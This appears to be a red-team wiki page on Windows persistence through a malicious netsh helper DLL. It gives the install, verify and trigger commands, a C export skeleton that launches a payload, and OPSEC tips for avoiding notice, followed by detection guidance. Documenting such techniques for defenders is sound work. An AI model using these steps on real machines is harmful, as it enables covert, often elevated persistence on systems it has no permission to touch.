---
title: NetSh Helper DLL Persistence
slug: netsh-helper-dll-persistence
---

> **TL;DR:** Register an attacker-controlled DLL as a `netsh` helper via `netsh add helper <evil.dll>` — every subsequent `netsh.exe` invocation (admin scripts, GPOs, login profiles) loads the DLL and calls its `InitHelperDll` export.

## What it is
`netsh.exe` is the legacy Windows network-shell utility. It supports modular subcommands implemented as helper DLLs registered under `HKLM\SOFTWARE\Microsoft\Netsh`. On startup `netsh.exe` enumerates that key and `LoadLibrary`s every value's path, calling each module's `InitHelperDll` export. Persisting a malicious helper there gives you code execution every time `netsh` runs — often elevated, because `netsh` is commonly launched from scripts, scheduled tasks, or interactively by admins. MITRE tracks this as **T1546.007**.

## Preconditions / where it applies
- Local administrator (write access to `HKLM\SOFTWARE\Microsoft\Netsh`)
- A DLL that exports `InitHelperDll` with the correct prototype so `netsh` doesn't immediately bail
- Some `netsh` invocation has to fire — common triggers: firewall management, WLAN profiles, branch-cache scripts

## Technique
Drop the DLL on disk in a path the helper key will reach, then use the built-in netsh command (which writes the registry value for you and validates the export). Trigger by running `netsh` once, or wait for a scheduled admin task.

```cmd
:: install
netsh add helper C:\ProgramData\Microsoft\evilhelper.dll

:: verify
reg query HKLM\SOFTWARE\Microsoft\Netsh

:: trigger
netsh
```

DLL skeleton (must export `InitHelperDll`):

```c
__declspec(dllexport) DWORD WINAPI InitHelperDll(DWORD dwNetshVersion, PVOID pReserved) {
    CreateThread(NULL, 0, payload, NULL, 0, NULL);
    return NO_ERROR;
}
```

OPSEC: command-line logging shows `netsh add helper`, and the parent of the spawned implant is `netsh.exe` (itself usually a child of `svchost.exe` for scheduled paths). Drop somewhere benign-looking; avoid `%TEMP%`.

## Detection and defence
- Sysmon EID 13 (`RegistryEvent`) on `HKLM\SOFTWARE\Microsoft\Netsh` — almost never legitimately written outside install/uninstall
- Sysmon EID 7 (`ImageLoad`) where `netsh.exe` loads an unsigned or non-`%SystemRoot%` DLL
- 4688 process create with `netsh.exe add helper` in the command line
- Application control (WDAC / AppLocker DLL rules) blocking unsigned DLLs from loading into `netsh.exe`

## References
- [ired.team — NetSh Helper DLL](https://www.ired.team/offensive-security/persistence/t1128-netsh-helper-dll) — original walkthrough
- [MITRE ATT&CK T1546.007](https://attack.mitre.org/techniques/T1546/007/) — technique mapping
- [outflank — NetshHelperBeacon](https://github.com/outflanknl/NetshHelperBeacon) — reference helper DLL

Related: [[tokens-and-privileges]]
